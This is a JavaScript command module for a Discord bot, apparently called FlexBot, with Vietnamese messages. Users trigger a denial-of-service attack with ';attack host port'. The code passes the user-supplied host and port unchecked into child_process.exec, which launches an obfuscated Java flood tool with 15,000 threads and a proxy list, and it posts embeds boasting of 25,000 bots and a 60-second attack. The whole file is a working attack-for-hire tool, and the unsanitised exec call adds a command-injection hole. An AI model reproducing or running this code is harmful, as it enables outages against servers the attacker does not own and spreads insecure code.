const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;attack 1.1.1.1 25565`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng trí ghi Cổng`")
	message.channel.send(embed1);
	return;
	}

if (message.channel.id != room) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Uả lệnh j lạ dzi')
	message.channel.send(embed1);
	return;
  }
var exec = require('child_process').exec
exec(`java -jar SynexHub_obf.jar host=${host} port=${port} threads=15000 file=proxies.txt method=aegis timeout=1000 loop=300`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **FlexBot V1.2** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã dừng lại 💥**")
	.setFooter('© Nhà phát triển MiniFlex#6903.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://c.tenor.com/4HRZBZapfssAAAAC/solo-leveling-sung-jin-woo.gif", "https://c.tenor.com/QVP_ZaioFPMAAAAC/solo-leveling-smile.gif", "https://c.tenor.com/0N_Otx22J7UAAAAd/sung-jin-woo-jin-woo.gif" , "https://c.tenor.com/9DKiAQSTDucAAAAd/jin-woo-sung-jin-woo.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **FlexBot V1.2** 🔥')
	.setTimestamp()
	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Cổng**: `" + port + "` \n **Phiên Bản**: `47` \n \n **Phương pháp**: `BigPacket 💥` \n **Số lượng Bot**: `25.000 🚀` \n **Thời gian**: `60 giây 🕒`")
	.setFooter('© Nhà phát triển MiniFlex#6903.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['aegis'],
  permLevel: 0
}

exports.help = {
  name: 'aegis',
  description: 'Özel',
  usage: 'aegis'
}